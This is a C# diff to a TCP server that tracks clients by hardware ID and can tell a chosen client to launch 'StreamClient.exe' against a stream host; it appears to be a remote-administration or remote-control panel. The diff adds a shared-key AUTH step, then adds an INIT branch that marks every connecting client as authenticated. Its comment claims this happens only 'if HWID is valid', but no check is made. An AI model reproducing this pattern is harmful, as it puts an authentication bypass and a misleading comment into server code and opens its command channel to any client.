@@ -494,6 +494,22 @@ namespace ServerTCP
 
             switch (action)
             {
+                case "AUTH":
+                    string authKey = packet.key?.ToString() ?? "";
+                    if (authKey == _serverKey)
+                    {
+                        _authenticatedClients[ipPort] = true;
+                        LogSystemMessage($"AUTH | SUCCESS | IP: {ipPort} | USER: {userId}");
+                        // Send auth confirmation
+                        SendPayload(ipPort, "{\"action\":\"AUTH_OK\",\"status\":\"authenticated\"}", "AUTH_OK");
+                    }
+                    else
+                    {
+                        LogSystemMessage($"AUTH | FAILED | Invalid key from {ipPort}");
+                        DisconnectClientFromServer(ipPort);
+                    }
+                    break;
+
                 case "HEARTBEAT":
                     // Activity already updated
                     break;
@@ -501,6 +517,8 @@ namespace ServerTCP
                 case "INIT":
                     string hwid = packet.hwid?.ToString() ?? "UNKNOWN";
                     LogSystemMessage($"INIT | HWID: {hwid} | IP: {ipPort} | USER: {userId}");
+                    // Auto-authenticate after INIT if HWID is valid
+                    _authenticatedClients[ipPort] = true;
                     break;
 
                 case "STREAMVIEWER":
@@ -705,10 +723,12 @@ namespace ServerTCP
                     LogSystemMessage($"Command: Disconnected {targetIp}");
                     return;
                 case 3: // Stream Viewer
+                    // Determine which stream host to use based on client IP type
+                    string streamHost = !string.IsNullOrWhiteSpace(_streamHostIPv4) ? _streamHostIPv4 : _streamHostIPv6;
                     payload = JsonConvert.SerializeObject(new
                     {
                         action = "streamviewer",
-                        ip = _streamHost,
+                        ip = streamHost,
                         port = _streamPort,
                         executable = "StreamClient.exe"
                     });
